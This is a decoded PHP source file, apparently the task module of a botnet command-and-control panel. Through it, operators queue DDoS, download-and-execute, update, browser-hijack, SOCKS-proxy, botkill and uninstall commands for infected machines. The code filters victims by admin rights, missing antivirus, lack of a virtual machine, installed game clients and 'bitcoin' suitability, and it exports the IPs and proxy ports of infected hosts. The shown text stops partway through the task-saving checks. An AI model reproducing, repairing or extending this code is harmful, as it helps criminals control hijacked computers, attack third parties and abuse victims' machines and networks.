<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "﻿\r\n\t";
if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
define("IN_TASKS_MODULE", 1);
$_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_UNKNOWN;
$_TASK_FILE_UI_FIELD_ERRORS = array("field_1" => "", "field_2" => "", "field_3" => "", "field_4" => "", "field_5" => "", "field_6" => "", "field_7" => "", "field_8" => "", "field_9" => "");
define("MOD_TASKS_ALERT_WIDTH", 1448);
define("TASK_OPTION_HAS_DOTNET", BOT_ATTRIBUTE_HAS_NET_FRAMEWORK);
define("TASK_OPTION_HAS_STEAM", BOT_ATTRIBUTE_HAS_STEAM);
define("TASK_OPTION_HAS_ADMIN_PRIVS", BOT_ATTRIBUTE_IS_ELEVATED);
define("TASK_OPTION_BITCOIN_RECOMMENDED", BOT_ATTRIBUTE_IS_GOOD_FOR_BITCOINS);
define("TASK_OPTION_HAS_USED_RDP", BOT_ATTRIBUTE_HAS_USED_RDP);
define("TASKS_NOTICE_SUCCESS_OK", "Task was successfully created!");
define("TASKS_NOTICE_SUCCESS_EDIT_OK", "Task was successfully edited!");
define("TASKS_NOTICE_ERROR_SQL_ERROR", "Unable to create new task due to unknown SQL error. Please try again.");
define("TASKS_NOTICE_ERROR_NAME_REQUIRED", "A name for this task is required. Please enter a name between 1 and 64 characters and try again.");
define("TASKS_NOTICE_ERROR_NAME_INVALID", "The task name you entered was either too long, too short or contained invalid characters. Please enter a alphanumeric name and try again.");
define("TASKS_NOTICE_ERROR_BOT_LIMIT_REQUIRED", "You must enter the number of bots this new task will affect. If you want it to apply to all current bots, please enter 0.");
define("TASKS_NOTICE_ERROR_BOT_LIMIT_INVALID", "Invalid bot limit. You must enter a valid numeric value for how many bots this task will apply to.");
define("TASKS_NOTICE_ERROR_EXPIRATION_REQUIRED", "You must select a valid expiration date while creating a new task.");
define("TASKS_NOTICE_ERROR_EXPIRATION_TOO_EARLY", "The expiration date you select must not be a date before today.");
define("TASKS_NOTICE_ERROR_OS_REQUIRED", "You must select at least one selection from the OS menu. Select 'All' if you want this task to affect all operating systems.");
define("TASKS_NOTICE_ERROR_COUNTRIES_INVALID", "It seems you provided more than 1 country for the task filter but failed to seperate them by a single comma. Please fix that.");
define("TASKS_NOTICE_ERROR_HOSTS_INVALID", "One or more of the hosts you provided seems invalid. Please fix this and try again.");
define("TASKS_NOTICE_ERROR_GUIDS_INVALID", "One or more of the GUIDs you provided seems invalid. Please fix this and try again.");
define("TASKS_NOTICE_ERROR_GROUPS_INVALID", "One or more of the group names you provided seems invalid. Please fix this and try again.");
define("TASKS_NOTICE_ERROR_INITIAL_STATE_REQUIRED", "You must select the initial state of this task (Active or suspended).");
define("TASKS_NOTICE_ERROR_COMMAND_REQUIRED", "A command type must be provided.");
define("TASKS_NOTICE_ERROR_EXPORT_DIR_ERROR", "Unable to open /exports/ directory to write socks client data. Please make sure this script has write access to the directory first.");
define("TASKS_NOTICE_ERROR_EXPORT_NO_EXPORTS", "Whoops! It seems there are no SOCKS server entries to export.");
define("TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE", "background-color: #FF6633;");
$tsk = isset($_GET["task"]) ? $_GET["task"] : "";
$tsk_ex = isset($_GET["s"]) ? $_GET["s"] : "";
if (!((int) $Session->Rights() & USER_PRIVILEGES_CREATE_TASKS)) {
    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to view / create client tasks.", true, 600);
} else {
    if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_DDOS) && $tsk == "ddos") {
        _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
    } else {
        if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_DOWNLOAD) && $tsk == "dw" && $tsk_ex == "") {
            _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
        } else {
            if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_UPDATE) && $tsk == "dw" && $tsk_ex == "update") {
                _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
            } else {
                if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_VIEW_URL) && $tsk == "browse" && $tsk_ex == "visit") {
                    _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                } else {
                    if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_HOMEPAGE) && $tsk == "browse" && $tsk_ex == "homepage") {
                        _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                    } else {
                        if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_CLEAR_COOKIES) && $tsk == "browse" && $tsk_ex == "clearcache") {
                            _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                        } else {
                            if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_SOCKS) && $tsk == "socks") {
                                _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                            } else {
                                if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_BOTKILL) && $tsk == "botkill") {
                                    _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                                } else {
                                    if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_TERMINATE) && $tsk == "die") {
                                        _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                                    } else {
                                        if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_UNINSTALL) && $tsk == "rem") {
                                            _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                                        } else {
                                            if (!((int) $Session->Rights() & USER_PRIVILEGES_CMD_SYSTEM) && $tsk == "sys") {
                                                _obfuscated_0D2F1D014015321E043E360208100C072A060513273022_();
                                            } else {
                                                $botsIndex = new CClient();
                                                $botsIndex->SetInternalLink($main_sql_link);
                                                $all_tasks = NULL;
                                                $total_num_tasks = 0;
                                                $total_num_completed_tasks = 0;
                                                $max_per_page = 20;
                                                $task_name_error = "";
                                                $task_max_bots_error = "";
                                                $task_exp_date_error = "";
                                                $task_operating_systems_error = "";
                                                $task_hosts_error = "";
                                                $task_guids_error = "";
                                                $task_groups_error = "";
                                                $total_num_exported = 0;
                                                $pp_export_path = DIR_EXPORTS . "/socks_" . @date("m_d_Y_his", @time()) . ".txt";
                                                $e_task_state = TASK_STATUS_ACTIVE;
                                                $e_task_name = "";
                                                $e_task_max_bots = 0;
                                                $e_task_expiration = 0;
                                                $e_task_mask_options = 0;
                                                $e_task_mask_general_options = TASK_GENERAL_OPTION_32BIT | TASK_GENERAL_OPTION_64BIT;
                                                $e_task_os = 0;
                                                $e_task_software = 0;
                                                $e_task_hosts = "";
                                                $e_task_groups = "";
                                                $e_task_guids = "";
                                                $e_task_countries = "";
                                                $e_expiration_date_string = "";
                                                $e_task_cmd_string = "";
                                                $e_task_extended_cmd_data = "";
                                                $e_task_edit_id = -1;
                                                $pp_current_task_view_page = (int) isset($_GET["task_page"]) ? $_GET["task_page"] : 1;
                                                $pp_current_task_bots_page = (int) isset($_GET["bots_page"]) ? $_GET["bots_page"] : 1;
                                                $task_path = "";
                                                $_TASK_COMMAND_STRING = "";
                                                $_TASK_EXTENDED_COMMAND_DATA = "";
                                                $_TASK_COMMAND_FIELDS = NULL;
                                                $guid_filter_type_value = "include";
                                                $ip_filter_type_value = "include";
                                                $group_filter_type_value = "include";
                                                $country_filter_type_value = "include";
                                                if (isset($_POST["remove_notice_submit"]) && isset($_POST["remove_notice_id"])) {
                                                    $notice_id = (int) $_POST["remove_notice_id"];
                                                    if (!$sqlDefault->Query("DELETE FROM " . $sqlDefault->pdbname . ".notices WHERE id = " . $notice_id . " AND notice_options & " . NOTICE_OPTION_ALLOW_REMOVE . " LIMIT 1")) {
                                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to delete notice #" . $notice_id . " due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
                                                    }
                                                }
                                                if (isset($_POST["guid_filter_type"])) {
                                                    $guid_filter_type_value = $_POST["guid_filter_type"];
                                                }
                                                if (isset($_POST["ip_filter_type"])) {
                                                    $ip_filter_type_value = $_POST["ip_filter_type"];
                                                }
                                                if (isset($_POST["group_filter_type"])) {
                                                    $group_filter_type_value = $_POST["group_filter_type"];
                                                }
                                                if (isset($_POST["country_filter_type"])) {
                                                    $country_filter_type_value = $_POST["country_filter_type"];
                                                }
                                                if (isset($_GET["task"]) && 0 < strlen($_GET["task"])) {
                                                    if (!ctype_alnum($_GET["task"])) {
                                                        exit("....");
                                                    }
                                                    $task_path = DIR_TASKS . "/task_" . $_GET["task"] . ".inc";
                                                }
                                                $es_task_action = isset($_GET["task_action"]) ? $_GET["task_action"] : "";
                                                $e_perms_can_edit_task = true;
                                                if ($es_task_action == "edit" && !((int) $Session->Rights() & USER_PRIVILEGES_EDIT_TASK)) {
                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to edit tasks.", true, 600);
                                                    $e_perms_can_edit_task = false;
                                                    $es_task_action = "";
                                                }
                                                if ($es_task_action == "edit" && isset($_GET["task_action_id"]) && is_numeric($_GET["task_action_id"])) {
                                                    global $_TASK_TYPE_LIST_STRINGS;
                                                    if ($e_perms_can_edit_task == true) {
                                                        $pp_tsk_id = (int) $_GET["task_action_id"];
                                                        $ms_row = $sqlTasks->GetTask($pp_tsk_id);
                                                        if ($ms_row) {
                                                            $e_task_state = $ms_row["status"];
                                                            $e_task_name = $ms_row["name"];
                                                            $e_task_max_bots = $ms_row["max_bots"];
                                                            $e_task_expiration = $ms_row["expiration_date"];
                                                            $e_task_mask_options = $ms_row["target_flags"];
                                                            $e_task_mask_general_options = $ms_row["target_general_flags"];
                                                            $e_task_os = $ms_row["target_os"];
                                                            $e_task_hosts = $ms_row["target_hosts"];
                                                            $e_task_groups = $ms_row["target_groups"];
                                                            $e_task_guids = $ms_row["target_guids"];
                                                            $e_task_software = $ms_row["target_software"];
                                                            $e_task_countries = $ms_row["target_locales"];
                                                            $e_expiration_date_string = date("m/d/Y", $ms_row["expiration_date"]);
                                                            $e_task_cmd_string = $ms_row["command"];
                                                            $e_task_extended_cmd_data = $ms_row["extended_command"];
                                                            $e_task_edit_id = $ms_row["id"];
                                                            if (2 <= strlen($e_task_countries)) {
                                                                $e_task_countries = str_replace(",", ", ", $e_task_countries);
                                                            }
                                                            $task_path = DIR_TASKS . "/task_" . _obfuscated_0D162F3C2C5C3D2C0A3B3E363931362A0B1D1F1E1B2F11_($_TASK_TYPE_LIST_STRINGS[$ms_row["task_type"]]) . ".inc";
                                                            $task_sp_info = _obfuscated_0D295B37273211312F292A5B0F070D342F010F1B331622_($_TASK_TYPE_LIST_STRINGS[$ms_row["task_type"]]);
                                                            if (0 < strlen($task_sp_info)) {
                                                                $_GET["s"] = $task_sp_info;
                                                            }
                                                        }
                                                    }
                                                }
                                                $es_task_ex_action = isset($_GET["task_ex"]) ? $_GET["task_ex"] : "";
                                                if (isset($_POST["export_submit"])) {
                                                    $sqlClients = new CClient();
                                                    $sqlClients->SetInternalLink($main_sql_link);
                                                    $all_socks = $sqlClients->GetClientsWithSocks();
                                                    if ($all_socks && 0 < @mysql_num_rows($all_socks)) {
                                                        $file_ptr = @fopen($pp_export_path, "w");
                                                        if ($file_ptr != NULL) {
                                                            if ($pp_export_path != NULL) {
                                                                while ($current_row = @mysql_fetch_assoc($all_socks)) {
                                                                    $export_line = @long2ip($current_row["LastIP"]) . ":" . $current_row["SocksPort"];
                                                                    if (isset($_POST["export_submit_tld"])) {
                                                                        $export_line .= ":" . $current_row["Locale"];
                                                                    }
                                                                    $export_line .= "\r\n";
                                                                    @fwrite($file_ptr, $export_line);
                                                                    $total_num_exported++;
                                                                }
                                                                @fclose($file_ptr);
                                                            }
                                                        } else {
                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_EXPORT_DIR_ERROR, true, MOD_TASKS_ALERT_WIDTH);
                                                        }
                                                    } else {
                                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_INFO, TASKS_NOTICE_ERROR_EXPORT_NO_EXPORTS, true, MOD_TASKS_ALERT_WIDTH);
                                                    }
                                                } else {
                                                    if ($es_task_action == "" && 1 < strlen($es_task_ex_action)) {
                                                        if ($es_task_ex_action == "clear") {
                                                            if (!((int) $Session->Rights() & USER_PRIVILEGES_DELETE_TASK)) {
                                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to delete tasks.", true, MOD_TASKS_ALERT_WIDTH);
                                                            } else {
                                                                $sqlTasks->ClearAll();
                                                            }
                                                        } else {
                                                            if ($es_task_ex_action == "clear_finished") {
                                                                if (!((int) $Session->Rights() & USER_PRIVILEGES_DELETE_TASK)) {
                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to delete tasks.", true, MOD_TASKS_ALERT_WIDTH);
                                                                } else {
                                                                    $sqlTasks->ClearFinishedTasks();
                                                                }
                                                            } else {
                                                                if ($es_task_ex_action == "suspend_all") {
                                                                    $sqlTasks->SuspendActiveTasks();
                                                                } else {
                                                                    if ($es_task_ex_action == "clean_all") {
                                                                        if ($botsIndex->SetAllBotsAsClean()) {
                                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Success! Number of bot(s) set to clean: " . mysql_affected_rows(), true, MOD_TASKS_ALERT_WIDTH);
                                                                        } else {
                                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to set dirty bots as clean.", true, MOD_TASKS_ALERT_WIDTH);
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                                if ($es_task_action == "toggle" && isset($_GET["task_action_id"]) && isset($_GET["task_toggle"])) {
                                                    if (is_numeric($_GET["task_action_id"])) {
                                                        $eg_task_id = (int) $_GET["task_action_id"];
                                                        if ($_GET["task_toggle"] == "suspend") {
                                                            $sqlTasks->SuspendTask($eg_task_id);
                                                        } else {
                                                            if ($_GET["task_toggle"] == "resume") {
                                                                $sqlTasks->ResumeTask($eg_task_id);
                                                            }
                                                        }
                                                    }
                                                } else {
                                                    if ($es_task_action == "delete" && isset($_GET["task_action_id"])) {
                                                        if (!((int) $Session->Rights() & USER_PRIVILEGES_DELETE_TASK)) {
                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to delete tasks.", true, MOD_TASKS_ALERT_WIDTH);
                                                        } else {
                                                            if (is_numeric($_GET["task_action_id"])) {
                                                                $eg_task_id = (int) $_GET["task_action_id"];
                                                                $sqlTasks->DeleteTask($eg_task_id);
                                                            }
                                                        }
                                                    } else {
                                                        if (!($es_task_action == "edit" && $e_perms_can_edit_task == false)) {
                                                            if (isset($_POST["task_save"]) && ($es_task_action == "add" || $es_task_action == "edit")) {
                                                                if (!isset($_POST["cmd_command"])) {
                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_COMMAND_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                } else {
                                                                    if (!isset($_POST["task_name"])) {
                                                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_NAME_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                        $task_name_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                    } else {
                                                                        if (!isset($_POST["task_max_bots"])) {
                                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_BOT_LIMIT_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                            $task_max_bots_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                        } else {
                                                                            if (!isset($_POST["task_exp_date"])) {
                                                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_EXPIRATION_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                                $task_exp_date_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                            } else {
                                                                                if (!isset($_POST["task_status"])) {
                                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_INITIAL_STATE_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                                } else {
                                                                                    if (!isset($_POST["task_operating_systems"])) {
                                                                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_OS_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                                        $task_operating_systems_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                    } else {
                                                                                        $e_task_state = (int) ($_POST["task_status"] == "active") ? TASK_STATUS_ACTIVE : TASK_STATUS_SUSPENDED;
                                                                                        $e_task_name = @_obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($_POST["task_name"]);
                                                                                        $e_task_max_bots = (int) $_POST["task_max_bots"];
                                                                                        $e_task_expiration = (int) strtotime($_POST["task_exp_date"]);
                                                                                        if (isset($_POST["task_hosts"]) && 6 < strlen($_POST["task_hosts"])) {
                                                                                            $e_task_hosts = @_obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($_POST["task_hosts"]);
                                                                                        } else {
                                                                                            $e_task_hosts = "";
                                                                                        }
                                                                                        if (isset($_POST["task_guids"]) && 31 < strlen($_POST["task_guids"])) {
                                                                                            $e_task_guids = @_obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($_POST["task_guids"]);
                                                                                        } else {
                                                                                            $e_task_guids = "";
                                                                                        }
                                                                                        if (isset($_POST["task_groups"]) && 1 < strlen($_POST["task_groups"])) {
                                                                                            $e_task_groups = @_obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($_POST["task_groups"]);
                                                                                        } else {
                                                                                            $e_task_groups = "";
                                                                                        }
                                                                                        $e_task_mask_options = 0;
                                                                                        $e_task_mask_general_options = 0;
                                                                                        $e_task_os = 0;
                                                                                        $e_task_software = 0;
                                                                                        $e_task_countries = isset($_POST["task_countries"]) ? _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_(str_replace(" ", "", $_POST["task_countries"])) : "";
                                                                                        $e_expiration_date_string = isset($_POST["task_exp_date"]) ? $_POST["task_exp_date"] : "";
                                                                                        $post_os_selections = $_POST["task_operating_systems"];
                                                                                        foreach ($post_os_selections as $post_os_option) {
                                                                                            if ($post_os_option == "all") {
                                                                                                $e_task_os = TASK_FILTER_OS_ALL;
                                                                                                break;
                                                                                            }
                                                                                            if ($post_os_option == "w8") {
                                                                                                $e_task_os |= WINDOWS_VERSION_W8;
                                                                                            } else {
                                                                                                if ($post_os_option == "w7") {
                                                                                                    $e_task_os |= WINDOWS_VERSION_W7;
                                                                                                } else {
                                                                                                    if ($post_os_option == "wv") {
                                                                                                        $e_task_os |= WINDOWS_VERSION_VS;
                                                                                                    } else {
                                                                                                        if ($post_os_option == "wxp") {
                                                                                                            $e_task_os |= WINDOWS_VERSION_XP;
                                                                                                        } else {
                                                                                                            if ($post_os_option == "ws08") {
                                                                                                                $e_task_os |= WINDOWS_VERSION_S2008 | WINDOWS_VERSION_S2008R2;
                                                                                                            } else {
                                                                                                                if ($post_os_option == "ws03") {
                                                                                                                    $e_task_os |= WINDOWS_VERSION_S2003;
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                        if (isset($_POST["task_options_dotnet"])) {
                                                                                            $e_task_mask_options = TASK_OPTION_HAS_DOTNET;
                                                                                        }
                                                                                        if (isset($_POST["task_options_steam"])) {
                                                                                            $e_task_mask_options |= TASK_OPTION_HAS_STEAM;
                                                                                        }
                                                                                        if (isset($_POST["task_options_used_rdp"])) {
                                                                                            $e_task_mask_options |= TASK_OPTION_HAS_USED_RDP;
                                                                                        }
                                                                                        if (isset($_POST["task_options_only_samsung"])) {
                                                                                            $e_task_mask_options |= BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE;
                                                                                        }
                                                                                        if (isset($_POST["task_options_only_apple"])) {
                                                                                            $e_task_mask_options |= BOT_ATTRIBUTE_HAS_APPLE_DEVICE;
                                                                                        }
                                                                                        if (isset($_POST["task_options_admin"])) {
                                                                                            $e_task_mask_options |= TASK_OPTION_HAS_ADMIN_PRIVS;
                                                                                        }
                                                                                        if (isset($_POST["task_options_bitcoin"])) {
                                                                                            $e_task_mask_options |= TASK_OPTION_BITCOIN_RECOMMENDED;
                                                                                        }
                                                                                        if (isset($_POST["task_options_no_virtual_machine"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_NO_VIRTUAL_MACHINE;
                                                                                        }
                                                                                        if (isset($_POST["task_options_only_no_av"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_NO_ANTIVIRUS;
                                                                                        }
                                                                                        if (isset($_POST["task_options_new_only"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_NEW_CLIENT_ONLY;
                                                                                        }
                                                                                        if (isset($_POST["task_options_old_only"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_OLD_CLIENT_ONLY;
                                                                                        }
                                                                                        if (isset($_POST["task_options_old6_only"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_OLD6H_CLIENT_ONLY;
                                                                                        }
                                                                                        if (isset($_POST["task_options_32bit"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_32BIT;
                                                                                        }
                                                                                        if (isset($_POST["task_options_64bit"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_64BIT;
                                                                                        }
                                                                                        if (isset($_POST["task_options_mark_only_favorites"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_ONLY_FAVORITES;
                                                                                        }
                                                                                        if (isset($_POST["task_options_mark_no_favorites"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_NO_FAVORITES;
                                                                                        }
                                                                                        if (isset($_POST["task_options_mark_as_dirty"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_MARK_AS_DIRTY;
                                                                                        }
                                                                                        if (isset($_POST["task_options_ignore_if_dirty"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_IGNORE_IF_DIRTY;
                                                                                        }
                                                                                        if (isset($_POST["task_options_apply_if_dirty"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_APPLY_IF_DIRTY;
                                                                                        }
                                                                                        if (isset($_POST["guid_filter_type"]) && $_POST["guid_filter_type"] == "exclude") {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_ALL_BUT_GUIDS;
                                                                                        }
                                                                                        if (isset($_POST["ip_filter_type"]) && $_POST["ip_filter_type"] == "exclude") {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_ALL_BUT_IPS;
                                                                                        }
                                                                                        if (isset($_POST["group_filter_type"]) && $_POST["group_filter_type"] == "exclude") {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_ALL_BUT_GROUPS;
                                                                                        }
                                                                                        if (isset($_POST["country_filter_type"]) && $_POST["country_filter_type"] == "exclude") {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_ALL_BUT_COUNTRIES;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_java"])) {
                                                                                            $e_task_software = BOT_SOFTWARE_JAVA;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_skype"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_SKYPE;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_visualstudio"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_VISUAL_STUDIO;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_vmware"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_VM_SOFTWARE;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_origin"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_ORIGIN_CLIENT;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_blizzard"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_BLIZZARD;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_lol"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_LEAGUE_OF_LEGENDS;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_runescape"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_RUNESCAPE;
                                                                                        }
                                                                                        if (isset($_POST["task_soft_minecraft"])) {
                                                                                            $e_task_software |= BOT_SOFTWARE_MINECRAFT;
                                                                                        }
                                                                                        if (!isset($_POST["task_options_32bit"]) && !isset($_POST["task_options_64bit"])) {
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_32BIT;
                                                                                            $e_task_mask_general_options |= TASK_GENERAL_OPTION_64BIT;
                                                                                        }
                                                                                        $test_hosts = str_replace(",", "", $e_task_hosts);
                                                                                        $test_hosts = str_replace(".", "", $test_hosts);
                                                                                        $test_hosts = str_replace(" ", "", $test_hosts);
                                                                                        $test_groups = str_replace(",", "", $e_task_groups);
                                                                                        $test_groups = str_replace(" ", "", $test_groups);
                                                                                        $test_guids = str_replace(",", "", $e_task_guids);
                                                                                        $test_guids = str_replace(" ", "", $test_guids);
                                                                                        if (6 < strlen($e_task_countries) && !strstr($e_task_countries, ",")) {
                                                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_COUNTRIES_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                                                        } else {
                                                                                            if (strlen($e_task_name) == 0 || 64 < strlen($e_task_name)) {
                                                                                                if (strlen($e_task_name) == 0) {
                                                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_NAME_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                } else {
                                                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_NAME_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                }
                                                                                                $task_name_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                            } else {
                                                                                                if ($e_task_max_bots < 0) {
                                                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_BOT_LIMIT_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                    $task_max_bots_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                                } else {
                                                                                                    if (strlen($e_task_expiration) < 6 || 14 < strlen($e_task_expiration)) {
                                                                                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_EXPIRATION_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                        $task_exp_date_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                                    } else {
                                                                                                        if ($e_task_expiration < (int) @strtotime(@date("m/d/Y", @time() + 43200))) {
                                                                                                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_EXPIRATION_TOO_EARLY, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                            $task_exp_date_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                                        } else {
                                                                                                            if (6 < strlen($test_hosts) && !ctype_alnum($test_hosts)) {
                                                                                                                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_HOSTS_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                                $task_hosts_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                                            } else {
                                                                                                                if (31 < strlen($test_guids) && !ctype_alnum($test_guids)) {
                                                                                                                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_GUID_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                                    $task_guids_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                                                                                                                } else {
                                                                                                                    if (1 < strlen($test_groups) && !ctype_alnum($test_groups)) {
                                                                                                                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_NOTICE_ERROR_GROUPS_INVALID, true, MOD_TASKS_ALERT_WIDTH);
                                                                                                                        $task_groups_error = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
